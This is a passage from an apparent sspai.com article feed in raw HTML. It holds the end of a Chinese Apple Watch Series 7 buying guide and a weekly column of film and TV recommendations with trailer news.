的计划，但是不准备选择新款，近期也会是一个不错的时机，毕竟新款上市之后，旧款产品势必将迎来价格下调。那么，面对不同的型号、尺寸和款式，Apple Watch 应该如何选择？少数派为你整理了一些重要信息，希望能够对你的选购提供参考。</p>\n<h2>外观</h2>\n<p>Apple Watch Series 7 是继 Apple Watch Series 4 之后，外观变化最大的一代升级：屏幕显示区域更大、边框更窄，还有全新配色可供选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/cd7edf3d01865e4f34c7d71c0dadfd30.jpg\"></figure><p>其中，不锈钢表壳依旧提供银色、金色、石墨色<sup class=\"ss-footnote\" href=\"\" title=\"前代产品提供深空黑色选项，从官网图片对比暂时看不出二者颜色存在区别。\" footnote-id=\"1\">1</sup>可供选择，钛金属表壳提供常规钛金属配色和深空黑色可选。铝金属表壳变化最大，提供了经过重新设计的午夜色、星光色、绿色、新款蓝色和红色可供选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/7b655571952e53e1575da72485286dd2.jpg\"><figcaption>午夜色、星光色、绿色、新款蓝色和红色</figcaption></figure><p>从材质上看，铝金属表壳观感呈现哑光质感，并且不易产生划痕；不锈钢表壳经过抛光打磨，质感更加出色，缺点也较明显，容易产生划痕；钛金属表壳的光亮程度介于铝金属与不锈钢之间，表面呈现材质特有的拉丝质感，得益于材料特性，适合存在金属过敏症状的用户选择。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/288907bc409bd323d60c959eab175f58.jpg\"><figcaption>银色、石墨色、金色</figcaption></figure><p>由于 Apple Watch Series 7 的产品页面暂未公布相关详细规格参数，对于不同型号表款的具体重量，暂时无法得知。通过旧款 Apple Watch 的相关参数可以发现，铝金属表壳版本的表款重量最轻，其次是钛金属版本，最重的是不锈钢版本。对于重量敏感的用户，可以据此作为选购 Apple Watch Series 7 的相关参考。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com//2020/09/19/ead2e59e0e64f69a4f1321f4197bdc96.png\"><figcaption>旧款 Apple Watch 表款重量对比</figcaption></figure><h2>尺寸与显示屏</h2>\n<p>Apple Watch Series 7 提供了 41mm 和 45mm 二种尺寸版本可供选择，尺寸越大，屏幕显示面积也就越大。</p>\n<p>Apple Watch Series 7 的一大升级，就是屏幕的显示区域更大、边框更窄。根据官网给出的信息，Apple Watch Series 7 较于前代产品的屏幕显示面积增加了 20%，边框收窄了 40%。同样，由于官网暂未公布 Apple Watch Series 7 的规格参数，我们只能通过官网公布的图片对于表壳尺寸进行粗略对比，可以看到，Apple Watch Series 7 与 Apple Watch Series 6 的表壳宽度基本一致，高度可能略高于后者，但也几乎可以忽略不计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/10f536c35e685c267e5c3c126769b1c6.png\"></figure><p>显示屏幕和尺寸双双变大，旧款 Apple Watch 用户也不用担心，根据目前 Apple 官网在售的新款 Apple Watch 表带提供的信息来看，能够做到对于新款表款在内大部份 Apple Watch 的兼容。因此，你的旧表带，同样可以用在 Apple Watch Series 7 上。</p>\n<p>对于之前选择 44mm 版本表壳的用户，由于 Apple Watch Series 7 的显示面积增加，考虑到 41mm 版本相较 45mm 版本售价更低，对于手表的屏幕大小没那么高的用户今年可以考虑尺寸更小的版本了。</p>\n<p>Apple Watch Series 6 与 Apple Watch SE 具有相同的表壳尺寸，大的 44mm，小的 40 毫米。Apple Watch Series 3 则有 42mm 和 38mm 可选，准备购入旧款手表的用户，根据自己对于屏幕大小、预算等方面的需求，按需选购即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/217f71ee36f8310d72603507b003e327.png\"><figcaption>目前在售的 3 款旧款型号的对比</figcaption></figure><p>值得注意的是，Apple Watch Series 7 的表镜相较前代产品增加了 50% 的厚度，由于缺少参数信息，表壳的厚度目前也不得而知，可能要等晚上订购开启之后，我们才能获得包括新款手表厚度在内的详细信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/aebbb4bf3e20b7614f453b0076966cf8.png\"></figure><p>对了，Apple Watch Series 7 不仅有了更加坚固抗裂的表径，也首次支持了 IP6X 防尘性能认证，防水深度与前代一致同样达到了 50 米。如果你经常佩戴 Apple Watch 进行各类户外运动，那么这代产品将会更耐用、更好用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/ca3268a6c8c0b0ee917a7fd633d0be87.png\"></figure><p>Apple Watch Series 7 继续采用了全天候视网膜屏，根据官网介绍，屏幕在室内时的显示亮度相较前代产品有多达 70% 的提升。</p>\n<h2>功能</h2>\n<p>与前几代产品不同，Apple Watch Series 7 没有在硬件方面增加针对运动健康相关的新功能，通过 watchOS 8 获得的功能升级与更新也基本都向旧款产品进行了开放，比如新的睡眠 App、正念 App 等。</p>\n<p>独占功能方面，新款 Apple Watch 仍依照惯例提供了专属表盘，分别是「轮廓表盘」和「双模块表盘」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/2aa2bab472e7b11afac2279d87785e0b.jpg\"><figcaption>轮廓表盘</figcaption></figure><p>可以看到，新的表盘也是针对新的屏幕设计进行优化。其中，「轮廓表盘」能够发挥曲屏优势，呈现更好的时标显示效果；「双模块表盘」则能利用更大的显示面积，更加直观地展示表盘上的信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/e6519828f25e727b7961b2dd3f2fd940.jpg\"><figcaption>双模块表盘</figcaption></figure><p>当然，Apple Watch Nike 与 Apple Watch Hermès 系列也推出了各自版本独家专享的新表带与表盘。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/c9d388b8ad9143efeddef5ba795ff507.png\"><figcaption>Apple Watch Nike 与 Apple Watch Hermès 系列</figcaption></figure><p>随大屏而来的，自然还有更大的操作空间。Apple Watch Series 7 首次将 QWERTY 全键盘输入法带到了手表上，计算器等 App 也有了更加复杂的键位设计，可以实现更多功能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/37d9989e623f028270e0b6a25a9d1a41.png\"></figure><p>因此，如果你更加看重 Apple Watch 的运动和健康功能，Apple Watch Series 6 就已经够用了，没有必要升级 Apple Watch Series 7。</p>\n<p>除了软件方面的升级，「超快速充电」也是今年 Apple Watch 上不得不提的一项新功能。搭配 USB-C 充电线，Apple Watch Series 7 的充电速度相较前代产品提高了 33%，只需充电 8 分钟，就能实现长达 8 小时的睡眠佩戴监测。</p>\n<p>需要注意的是，Apple Watch Series 7 的快速充电功能需要配合 USB-C 充电线才能实现，使用 USB-A 充电线只能实现与前代相同的「慢速」充电。此外，目前 Apple 官网在售、支持给 Apple Watch 充电的 MagSafe Duo CHarger，也无法在新表上实现快速充电功能。当然，由于硬件上没有支持，使用 USB-C 充电线为旧款手表充电，无法实现快速充电。</p>\n<p>续航方面，根据目前给出的信息来看，Apple Watch Series 7 的全天续航时长为 18 小时，与 Apple Watch Series 6 保持了一致，没有任何提升。</p>\n<h2>选购建议</h2>\n<p>最后来说说选购建议。</p>\n<p>购买 Apple Watch，主要无非有这 2 种需求：</p>\n<ul>\n<li>想买一块戴着还行的手表。</li>\n<li>经常运动，重视身体健康。</li>\n</ul>\n<p>当然，能接收 iPhone 通知、进行一些简单的 App 操作，想必也是不少用户看重的功能。从「选块好看的表」的角度考虑，很明显目前官方仍然在售的 Apple Watch Series 3 不是一个好的选择，它仍然停留在「上一代设计」，功能相比 Apple Watch SE 都有不少缺失，尤其是紧急呼叫、摔倒监测、噪声监测这样重要的功能；以推出时间来看，它的生命周期也会更短，也许在不远的将来，这款 2017 年推出的产品，就会失去对于新的 watchOS 系统的支持。</p>\n<p>如果你预算有限又没那么有限，Apple Watch SE 就是不错的选择。更加现代化的圆角表壳设计，支持大部分你平时能用得上的健康功能，比如心率监测报警、紧急呼叫、摔倒监测等等；价格也相对合理，买一块能用上好几年。</p>\n<p>如果你已经决定入手最新款的 Apple Watch Series 7，选择哪款更重要的决定因素，毫无疑问依然是预算。如果从使用场景上来看，铝金属版本更加轻盈，也更加耐用——比如不易产生划痕，价格还更低，是更适合运动爱好者的选择。</p>\n<p>如果你在健康功能之外同样很看重这块手表戴在你手上的质感与搭配程度，不锈钢版本不论是表壳的质感、光亮程度还是价格，都处在更好也更加「平衡」的区间，不过也需要提醒一句，由于不锈钢材质本身的特性，用久了之后划痕在所难免，不怕麻烦的话也可以自己选购合适的抛光工具进行处理，介意划痕的话还是慎重选择。至于 Apple Watch Edition 和 Hermès 版本，会选择它们相信你也不仅是预算充足，对于品牌也有一定追求，该不该选自然也就不用多说了。</p>\n<p>至于选 GPS 还是 GPS + 蜂窝版本这个一直没有结论的话题，还是那句话，这是一项大部分人在大部分情况下都用不到的功能，但是一旦用上说不定能帮上大忙。我的建议是大部分人直接选择 GPS 版本即可，如果你很明确地知道自己需要蜂窝数据功能，那么也不必多说。当然，选择 GPS + 蜂窝版本，除了多花钱，肯定也不会出错，真要选的话不如当作是买了一份小额保险，也希望你永远都用不上这份「保险」。</p>\n<p>Apple Watch Series 7 即将开售，今晚你买不买？不妨在评论区和我们分享你的决定，以及对于 Apple Watch 的看法。</p>\n<p><strong>推荐阅读</strong></p>\n<ul>\n<li><a href=\"https://sspai.com/post/56980\" target=\"_blank\">一派 | 刚买了新 Apple Watch 的四位编辑，谈了谈他们的使用体验</a></li>\n<li><a href=\"https://sspai.com/post/68748\" target=\"_blank\">watchOS 8 正式版来了，这些新功能值得尝鲜</a></li>\n</ul>\n<p>&gt; 关于 iPhone 13 的一切，都在 <a href=\"https://sspai.com/topic/362\" target=\"_blank\">这里</a> 了 📱</p>\n<p>&gt; 这些升级之后不能错过的功能与技巧，让你 <a href=\"https://sspai.com/topic/363\" target=\"_blank\">玩转 iOS 15</a> 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/69142"},{"title":"本周看什么丨最近值得一看的 8 部作品","date":"2021-10-08 09:01:13","description":"\n<h2>☕️ TL;DR</h2>\n<ul>\n<li>近期佳作推荐：[美剧] 婚姻生活、[电影] 援助、[动画] 古见同学有交流障碍症。、[综艺] 屋檐之夏、[美剧] 女佣、🔦 [电影] 犬之力、[电影] 酷爱电影的庞波小姐、[丹麦剧] 寒栗</li>\n<li>几则精彩预告：好莱坞科幻片《沙丘》发布终极预告，10 月 22 日中国内地上映、动画剧集《银翼杀手：黑莲花》11 月 13 日上线、《权力的游戏》衍生剧集《龙之家族》2022 年上线、《生化危机：欢迎来到浣熊市》公布预告，11 月 24 日北美上映</li>\n<li>几则影视资讯：Apple TV+ 正式续订《基地》第二季、英剧《浴血黑帮》将制作电影版、台剧《华灯初上》11 月 26 日上线 Netflix、西蒙·金伯格执导电影《355》发布全新海报和预告，2022 年 1 月 7 日北美上映</li>\n<li>🎬 <strong>秋日特辑：</strong><a href=\"https://sspai.com/post/69093\" target=\"_blank\"><strong>这 10 部电影，让你不再错过秋天的短暂赏味期</strong></a> 🍁</li>\n</ul>\n<h2>👀 N 部作品推荐</h2>\n<p>根据读者反馈，如果推荐语涉及剧透（对故事核心、暗线、伏笔、结局等关键要素的透露），我们会在对应作品的标题前增加 🔦 的 Emoji。</p>\n<p>如有其他建议也欢迎在评论区提出，感谢大家对「看什么」栏目的喜爱和支持。</p>\n<h3>[美剧] 婚姻生活</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/0ed45f5b6d5eb0c542825097828e3efd.png\"></figure><p>关键词：剧情</p>\n<p>片长：60 分钟（单集）× 5 集；<a href=\"https://movie.douban.com/subject/35136700/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>我不喜欢你了，要怎么补救？</p></blockquote>\n<p>@宇宙浪费指南 ：如果说斯嘉丽的《婚姻故事》中那段争吵名场面带给人的是扑面而来的压迫感，让人代入感极强、忍不住想逃，那么这部《婚姻生活》则是漫不经心的带人走入并感受他们的婚姻，再一点点令人窒息。</p>\n<p>这部剧改编自 Ingmar Bergman1973 年的瑞典迷你剧，故事聚焦一对当代美国夫妇，重新审视爱情、憎恨、欲望、一夫一妻制、婚姻及离婚等议题。</p>\n<p>我不想过多地赞美演员的演技，能自然地把人带到这场婚姻里，大段的对白、克制和爆发的情绪都证明了这一点。Oscar Issac 饰演的丈夫从最初得知消息后的难以置信、到卑微地挽回、失控的发泄、失望的愤恨，以及最后绝望的冷漠，把对这段婚姻的破碎和内心的重建演绎得淋漓尽致。</p>\n<p>剧中大段的对白，反复讨论的都是一个主题——婚姻究竟如何经营？第一集中，男女主的朋友是一对选择开放式关系的夫妻，或许这是他们对自己的婚姻交出的答卷，或许认为这种方式能让他们比平均八年的美国婚姻时长更持久，而男主与朋友的对话或是在隐隐点题：人究竟是要征服欲望还是屈服欲望？这让我想到了杨蒙恩在《吐槽大会》上的求婚，他说「没有天生的好人，只有被约束的文明者」，或许是对婚姻的理解和这个问题的回答吧。</p>\n<h3>[电影] 援助</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/56c50f5c80aad4bc59aa72ee9e46dd54.png\"></figure><p>关键词：剧情</p>\n<p>片长：98 分钟；<a href=\"https://movie.douban.com/subject/35259282/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>「劳模」又有新电影了！</p></blockquote>\n<p>@宇宙浪费指南 ：因《杀死伊芙》而被中国观众熟知的「小变态」朱迪·科默，前段时间刚出现在大荧幕上，饰演《失控玩家》里的女主，没多久又一部电影播出了。</p>\n<p>这部由英国公共电视台 Channel 4 出品的电影聚焦第一波新冠疫情中受到极大冲击的英国护理中心，围绕护理院一位早发型阿尔茨海默病患者 Tony（斯蒂芬·格拉汉姆扮演）和新护工 Sarah（朱迪·科默）的故事展开，以普通人的视角和命运来反映英国官方在疫情爆发初期的无能。</p>\n<p>Sarah 很聪明，但在学习和工作中一直都不合群，她来到护理院之后，却意外地在这里找到了使命和价值。她十分善于和护理中心的居住者沟通，尤其是 47 岁的 Tony ，但当疫情来临，这一切都在顷刻间崩塌……</p>\n<p>朱迪·科默贡献出了有史以来最动人的演技，中间 20 分钟左右的长镜头来回地跟拍，摇晃的镜头、怼脸拍的特写和急促的呼吸看得人窒息，坐在车里崩溃的一段戏爆发力极强，对着镜头不停诘问，声嘶力竭地喊出「No one’s coming」的时候，实在太令人痛心了。这部电影，或许诠释的就是「时代的一粒灰，落在个人头上，就是一座山」这句话吧。</p>\n<h3>[动画] 古见同学有交流障碍症。</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/4fbb26275457103eb5a9c682d8f9a344\"></figure><p>关键词：漫画改 / 校园 / 恋爱 / 搞笑</p>\n<p>片长：24 分钟（单集）× 具体集数未知，每周三更新</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/title/81228573\" target=\"_blank\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34982453/\" target=\"_blank\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://manga.bilibili.com/detail/mc26468\" target=\"_blank\">哔哩哔哩漫画</a></p>\n<blockquote><p>蛐蛐只野是读心能力者。</p></blockquote>\n<p>@SHY：古见硝子是美少女，品学兼优，出尘脱俗，去神社会被人参拜，走三步就有人告白，却有交流障碍症，连完整的句子都无法当面说出。古见同学渴望与人正常沟通，愿望是交到 100 个朋友，但一直无人理解，只能暗自纠结。直到高中入学第一天，古见同学遇到了过于普通的同桌只野仁人，后者察觉到她的隐情，自告奋勇成为其第一个朋友，并决心帮她实现梦想——但是，只野同学还没有发现，这里是名门·私立伊旦高中，录取学生的标准并非成绩，而是「个性」。长名驯染是发小，山井恋是病娇，中中思春是中二病……在怪人云集的这所学校，古见同学想交到朋友，可没有那么简单。</p>\n<p>《古见同学有交流障碍症。》前期是近几年最有趣的校园漫画之一，改编成动画却必须费一番苦心：每话只占几页篇幅，之间往往没有联系，该如何编排叙事，做到无缝衔接；古见同学几乎没有台词，要怎样展现其魅力，刻画内心独白，又不违背人设；原作大量使用的拟声词等表现手法，依托于漫画体裁，全盘照搬有碍观感，另起炉灶更考验水平。「古见同学不会动画化」这梗固然有小学馆不上心和粉丝调侃成分，却也一定程度上道出了其艰辛。</p>\n<p>坦白说，我从未想到《古见同学有交流障碍症。》的动画质量会这么高，已播出的第一集作画、演出、音乐全方位拔尖，几乎挑不出瑕疵。导演川越一生继承漫画表现方式的同时，活用别致而有趣的演出，为略无聊的黑板交流赋予了文艺气质，煽情与搞笑均恰到好处。矢岛哲生负责的 <a href=\"https://www.youtube.com/watch?v=pRFgMtHtvYY\" target=\"_blank\">OP 动画</a> 令人印象深刻，桥本由香利的音乐也增色不少，达到了一加一大于二的效果。只靠充足的经费和工期，远不足以做到这一步，还需要制作组对作品倾注的爱。只要保持目前的节奏，年度最佳恋爱喜剧非它莫属。</p>\n<h3>[综艺] 屋檐之夏</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/77b3933a5d100aff2bd268ab6cf71e54\"></figure><p>关键词：真人秀</p>\n<p>片长：60 分钟（单集，具体集数未知）</p>\n<p>观看渠道：<a href=\"https://www.bilibili.com/bangumi/play/ep423456\" target=\"_blank\">哔哩哔哩</a>；<a href=\"https://movie.douban.com/subject/35518766/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>屋檐之下，欢迎回家。</p></blockquote>\n<p>@潘誉晗：这部由 B 站出品，在中国老龄协会指导下拍摄的综艺记录了上海 3 位独居老人和沪漂年轻人一起居住 21 天的生活。他们的相处是变成灾难，还是因为不一样的火花而变成无话不谈的忘年之交？真是令人好奇。</p>\n<p>一部很好笑也很好哭的综艺。原来再坚强的人成了独居老人之后，也会有令人心酸之处，而那些看上去接受新事物很快的年轻人，在面对生活阅历丰富的老年人时，也会有尴尬的事情发生。文化的交流和年龄的代沟，这一刻碰撞在一起，在令人在发笑的同时，也被温暖着、反思着。近几年国内的观察类真人秀节目层出不穷，在如今这个老龄化时代出现这样一档综艺，的确很「有必要」。社会老龄化已经是一个不可避免的问题，人类因长寿而带来的独居生活也一定不会是太遥远的话题，由于老人独居所发生的悲剧屡见不鲜，所以通过这样一档节目让更多的人关注到这个问题，个人觉得真的很棒。</p>\n<h3>[美剧] 女佣</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/a0379840676327e40de75ec92b75dd51.png\"></figure><p>关键词：剧情 / 喜剧</p>\n<p>片长：60 分钟（单集）× 10 集；<a href=\"https://movie.douban.com/subject/34925417/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>回去的比不回去的多，平均次数是 7 次。</p></blockquote>\n<p>@宇宙浪费指南 ：看剧时被不时闪过的弹幕提醒到，越想越觉得女主的生活（单亲妈妈亚历克斯）像极了《无耻家庭》里菲奥娜可能会展开的生活方向，于是去查了导演，果然是《无耻家庭》的导演约翰·威尔斯，我也不自觉在看的时候，把亚历克斯想象成平行时空的菲奥娜，她有着糟糕的父母，有一个酒鬼且家暴的丈夫，同时，她还拥有一个可爱的孩子。</p>\n<p>《女佣》改编自斯蒂芬妮·兰德的《纽约时报》畅销回忆录《Maid: Hard Work, Low Pay, and a Mother’s Will to Survive》，它描述了一个单亲妈妈的生活——靠当女佣来艰难地维持生计，同时努力摆脱受虐关系和流离失所的状态，以便为女儿麦蒂创造更好的生活。</p>\n<p>这部剧对女性的艰辛处境没有丝毫的遮掩，当一个女人遭遇家庭暴力、精神暴力，她失去自由、没有工作、没有住处、被剥夺抚养孩子的权利……难以想象身处其中，经历一连串的打击时，她究竟有多绝望。但她是个母亲，为了孩子，她一直在抗争、在努力，对待孩子始终温柔，无论历经多少次打击、多少次走到山穷水尽的绝望尽头，她都没有崩溃，勇敢地挣脱了一切枷锁和束缚，离开了这个环境，带女儿获得了自由。剧中讨论的话题颇为沉重，丝毫不理解为什么奈飞打上了「喜剧」的标签，但不得不说，剧情细腻动人，没有一味的脸谱化任何人，孩子爸爸的最后的 「You should have full custody for our baby」让这个人物立体了起来。</p>\n<p>这部剧大概会提名明年的艾美奖吧。</p>\n<h3>🔦 [电影] 犬之力</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/74857f850edc9e260de6421e34391bdb\"></figure><p>关键词：剧情 / 同性 / 西部</p>\n<p>片长：127 分钟（单集）；<a href=\"https://movie.douban.com/subject/33437152/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>情潮暗涌，他只是一个想要爱的男人罢了。</p></blockquote>\n<p>@潘誉晗：本尼饰演的菲尔和弟弟一起经营着一家牧场，他粗鲁、邋遢，但有着极强的控制欲，所以当弟弟带着新婚妻子和她的儿子彼特一起走进他的生活时，菲尔不但不喜欢这个弟媳，更看不惯彼特的性格。可当菲尔发现彼特也可以看到隐藏在山中的犬吠之形时，他对彼特的态度，也悄然发生了变化。</p>\n<p>把剧情看成叔侄恋真的是对影片最大的误解，作为一位女性导演，坎皮恩为我们展现的这份情感其实很克制，更多的是在西部牛仔的世界中，不同力量地互相制衡和抗争。无论是看似暴戾的菲尔心中藏着的那份柔软，还是看似柔弱的彼特可以面不改色地解剖一只兔子，都暗含深意，尤其是性格差异与最后剧情造成的反转真的令人拍案叫绝。最后叔侄谷仓的对手戏也特别精彩，两个人眼神的交换和昏黄的暧昧，在烟雾下更为撩人。观看前半部分可能需要一点耐心，但当后半部分本尼把那份克制和隐忍的情绪都展现出来的时候，真的被他的演技所折服。今年威尼斯电影节银狮奖最佳导演果然名不虚传。</p>\n<h3>[电影] 酷爱电影的庞波小姐</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/article/63e453a573566f21258bbb6be6b878d0\"></figure><p>关键词：漫画改 / 剧情 / 艺术 / 励志</p>\n<p>片长：94 分钟</p>\n<p>观看渠道：<a href=\"https://video.unext.jp/play/SID0061804/ED00336524\" target=\"_blank\">U-NEXT</a>；<a href=\"https://movie.douban.com/subject/30037194/\" target=\"_blank\">豆瓣链接</a></p>\n<p>读原作：<a href=\"https://book.douban.com/subject/35308375/\" target=\"_blank\">台湾角川</a></p>\n<blockquote><p>去拍电影或者去死，我只有这两条路可选。</p></blockquote>\n<p>@SHY：《酷爱电影的庞波小姐》是一部关于拍摄电影的电影，在电影圣地喵莱坞，干练的天才制片人庞波小姐拥有电影人所需的一切人脉与才华，穿梭于各个片场，拍的却尽是 B 级片。担任其助手的青年吉恩虽然对此颇有疑问，却忠实于本职工作，并用心记下片场的点滴细节，憧憬着能独立拍摄电影的那天。某日，吉恩拿到了庞波小姐亲手策划的最新剧本《MEISTER》，男主角是阔别影坛十年的传说影星，女主角是刚刚出道的新人，而被指名为导演的竟然是吉恩自己。为了拍出庞波小姐所说的「名作」，满怀着不安和期待，吉恩与剧组来到瑞士，波澜万丈的现场摄影即将开始。</p>\n<p>用电影诠释电影，《酷爱电影的庞波小姐》最突出的亮点是极富想象力的镜头剪辑与转场方式，特别是主角团集结前，以跳脱却不凌乱的闪回串起每个人交错的生活轨迹，一气呵成，分外畅快。电影的画幅随叙事变化，提到的知识点往往会立即运用，达成在电影里看电影的奇妙观感。这种氛围若能贯彻如一，本作无疑会是一部杰作，后半部分突兀的原创剧情却完全毁掉了前半的精巧构思。都合的融资桥段不仅缺乏逻辑，更否定了原著中洋溢的理想主义精神，将故事矮化为廉价的工业鸡汤。全篇都在大谈特谈控制时长的重要性，却为了凑足院线一个半小时而迷失方向，着实有些讽刺。但总体来说，这仍是一部娱乐性满载的良作，即使只为了欣赏演出也值得抽出时间观看。</p>\n<h3>[丹麦剧] 寒栗</h3>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/10/08/7e474f9b640d534315fb8eacb00c8cfc.png\"></figure><p>关键词：悬疑 / 惊悚 / 犯罪</p>\n<p>片长：60 分钟（单集）× 6 集</p>\n<p>观看渠道：<a href=\"https://www.netflix.com/tw/title/81039388?s=i&amp;trkid=13747225&amp;vlang=zh&amp;clip=81465058\" target=\"_blank\">Netflix</a>；<a href=\"https://movie.douban.com/subject/34800967/\" target=\"_blank\">豆瓣链接</a></p>\n<blockquote><p>如果你看见了一个栗子人，那是因为你早就已经被盯上了。</p></blockquote>\n<p>@潘誉晗：哥本哈根最近很不太平，几起连环女性杀人事件的唯一线索是案发现场都留下了一个栗子人，而上面留下的指纹，竟来自女政治家罗莎一年前已经失踪的女儿。于是，女警官图林和调来的男搭档马克，要做的不仅仅是面对未知的凶手亟待破案那么简单了，本以为死去的政客女儿是否还活着也是他们需要寻找的真相。</p>\n<p>一部非常适合秋季观看的悬疑剧，尤其是片头呈现出的大片的秋色，配合着剧中的重要工具栗子人的出现，增添了不少肃杀的诡谲感。前三集营造的氛围非常好，隐藏在暗处的凶手、凶手视角下的被害人都是猎物。本是被孩子们当作玩具的栗子人不合时宜地出现在被肢解的尸体旁，异常诡异，而死者都是不负责任的母亲的角色设定，也拓宽了剧集的深度。比起几部大热剧，这算是近期较为冷门的新剧了，整体风格的塑造也维持了北欧刑侦剧一贯的冷静自持，值得一看。</p>\n<h3>更多</h3>\n<p><a href=\"https://movie.douban.com/subject/35584692/\" target=\"_blank\">[英剧] 霍林顿大道</a> @潘誉晗：因为是被伤害所生下的孩子，所以担心遗传到生父暴力的特丽莎在发现儿子可能造成他人失踪后内心变得更加不安了，于是，她和自己的姐姐开始调查事情的真相。涉及的儿童失踪案件本身不算复杂，不过在几条支线的衬托下剧情就显得饱满了起来，女演员们的演技很好，很容易就被代入了剧情。</p>\n<p><a href=\"https://movie.douban.com/subject/35460234/\" target=\"_blank\">[日剧] 所罗门的伪证</a> @潘誉晗：宫部美雪的经典之作再次被改编成了日剧，这次 WOWOW 台的脚本把初中的设定直接改成了高中，聚焦校园暴力下死亡孩子的真相，到底是自杀，还是如举报信所说是被人杀害？需要调查才能找到答案。剧集整体的打光偏冷色调，配合剧情观看还是很有氛围感的。</p>\n<h2>📅 本周新预告</h2>\n<h3>好莱坞科幻片《沙丘》发布终极预告，10 月 22 日中国内地上映</h3> <p>10 月 8 日，由《降临》《银翼杀手 2049》导演丹尼斯·维伦纽瓦执导的科幻片《沙丘》发布终极预告。该片由提莫西·查拉梅、丽贝卡·弗格森、张震、乔什·布洛林、奥斯卡·伊萨克、哈维尔·巴登、赞达亚、杰森·莫玛、戴夫·巴蒂斯塔等群星出演，将于 10 月 22 日中国内地上映。</p>\n<h3>动画剧集《银翼杀手：黑莲花》11 月 13 日上线</h3> <p>10 月 8 日，Adult Swim 与 Crunchyroll 联合出品的原创动画剧集《银翼杀手：黑莲花》公布了正式预告，第一季共 13 集，11 月 13 日上线。本作由神山健治、荒牧伸志执导，渡边信一郎创意制片，Sola Digital Arts 制作，设定在《银翼杀手：2022 黑暗浩劫》后，讲述女性复制人 Elle 的冒险，《银翼杀手》正作角色也将登场。 <a href=\"https://www.youtube.com/watch?v=eUu3lK_Z8VM\">来源</a> </p>\n<h3>《权力的游戏》衍生剧集《龙之家族》2022 年上线</h3> <p>10 月 5 日，《权力的游戏》衍生前传剧集《龙之家族》公布了首支先导预告，第一季共 10 集，将于 2022 年登陆 HBO Max。本作改编自乔治·R·R·马丁的小说《血与火》，米格尔·萨普什尼克执导，莱恩·康道尔编剧，艾玛·达西、马特·史密斯、帕迪·康斯戴恩、奥利维亚·库克等主演，聚焦坦格利安家族的内部纷争「血龙狂舞」。 <a href=\"https://twitter.com/HouseofDragon/status/1445373212079140864\">来源</a> </p>\n<h3>《生化危机：欢迎来到浣熊市》公布预告，11 月 24 日北美上映</h3> <p>10 月 7 日，索尼影业公布了《生化危机》系列重启电影《生化危机：欢迎来到浣熊市》的首支正式预告，将于 11 月 24 日登陆北美院线。本作由约翰内斯·罗伯茨执导，罗比·阿美尔、卡雅·斯考达里奥、阿万·乔贾、汉娜·乔恩-卡门等主演，讲述克里斯、克莱尔、里昂、吉尔等主角初次踏入被丧尸危机笼罩的浣熊市时发生的故事。 <a href=\"https://www.youtube.com/watch?v=4q6UGCyHZCI\">来源</a> </p>\n<h3>更多</h3>\n<p><strong>《</strong><a href=\"https://www.bilibili.com/video/BV1Rq4y1R7PD\" target=\"_blank\"><strong>名侦探柯南 零的日常》《犯人犯泽先生》将改编为动画</strong></a><strong>：</strong>10 月 4 日，作为青山刚昌的漫画《名侦探柯南》第 100 卷发售纪念活动之一，两部衍生漫画《零的日常》和《犯人犯泽先生》宣布将改编为动画。前者由新井隆广创作，讲述拥有公安、侦探、黑衣组织成员三张面孔的男人安室透不为人知的日常；后者由神庭麻由子创作，讲述未来某起案件的真凶犯泽先生在世界犯罪都市米花镇的艰辛求生之路。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1wf4y1c7t3\" target=\"_blank\"><strong>安德鲁·加菲尔德主演新片《倒数时刻》11 月 19 日上线 Netflix</strong></a><strong>：</strong>10 月 4 日，由林-曼努尔·米兰达执导，安德鲁·加菲尔德主演的电影《倒数时刻》发布全新预告。影片改编自《吉屋出租》作者乔纳森·拉森的同名自传式音乐剧，讲述一位年轻但野心勃勃的音乐剧作曲家的故事，将于 11 月 19 日上线 Netflix。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1uq4y1N7Bp\" target=\"_blank\"><strong>林嘉欣主演电影《美国女孩》发布先导预告</strong></a><strong>：</strong>10 月 5 